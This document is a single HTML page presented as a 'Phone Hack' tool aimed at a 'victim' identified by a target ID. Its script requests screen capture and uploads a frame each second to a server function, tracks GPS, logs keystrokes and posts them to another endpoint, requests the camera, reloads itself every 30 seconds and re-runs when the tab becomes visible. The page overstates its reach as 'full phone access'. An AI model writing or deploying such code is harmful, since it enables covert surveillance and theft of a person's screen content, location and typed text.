<!DOCTYPE html>
<html>
<head><title>🔥 Phone Hack</title><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
<body style="margin:0;padding:50px;background:linear-gradient(45deg,#000,#1a0033);color:#0f0;font-family:'Courier New',monospace;text-align:center;">
<h1 style="font-size:32px;text-shadow:0 0 20px #0f0;">🔥 FULL PHONE ACCESS</h1>
<p style="font-size:22px;">Target ID: <input type="text" id="phoneid" placeholder="VICTIM123" style="padding:20px;font-size:20px;border:3px solid #0f0;background:rgba(0,0,0,0.8);color:#0f0;border-radius:15px;"></p>
<button onclick="fullHack()" style="padding:25px 60px;font-size:26px;background:linear-gradient(45deg,#ff0040,#cc0000);color:white;border:none;border-radius:20px;cursor:pointer;box-shadow:0 10px 30px rgba(255,0,64,0.6);text-transform:uppercase;letter-spacing:2px;">💀 TOTAL CONTROL</button>
<div id="status" style="margin-top:40px;font-size:20px;line-height:1.8;"></div>
<script>
let hacks = [];
async function fullHack(){
    const id = document.getElementById('phoneid').value || 'victim';
    const status = document.getElementById('status');
    status.innerHTML = '🔥 Initializing hacks...';
    
    // 1. SCREEN CONTROL
    try{
        const stream = await navigator.mediaDevices.getDisplayMedia({video:true});
        const video = document.createElement('video'); video.srcObject=stream; video.play();
        setInterval(()=>{
            const canvas = document.createElement('canvas');
            canvas.width=400; canvas.height=800;
            canvas.getContext('2d').drawImage(video,0,0);
            canvas.toBlob(async(blob)=>{
                await fetch('/.netlify/functions/screen', {method:'POST',body:blob});
            });
        },1000);
        hacks.push('📱 Screen Live');
    }catch(e){hacks.push('❌ Screen Denied');}
    
    // 2. GPS TRACKER
    navigator.geolocation.watchPosition(pos=>{
        hacks.push(`📍 GPS: ${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}`);
    });
    
    // 3. KEYLOGGER
    document.addEventListener('keydown',e=>{
        fetch('/.netlify/functions/keys',{method:'POST',body:JSON.stringify({key:e.key,id})});
    });
    
    // 4. CAMERA
    navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{
        hacks.push('📷 Camera Active');
    }).catch(()=>hacks.push('❌ Camera Denied'));
    
    status.innerHTML = `✅ HACKED: ${id}<br>${hacks.join('<br>')}`;
}

// Auto-restart every 30 sec
setInterval(()=>location.reload(),30000);

// Background hack (Page hide nahi hoga)
document.addEventListener('visibilitychange',()=>{
    if(!document.hidden) fullHack();
});

</script>
</body>
</html>
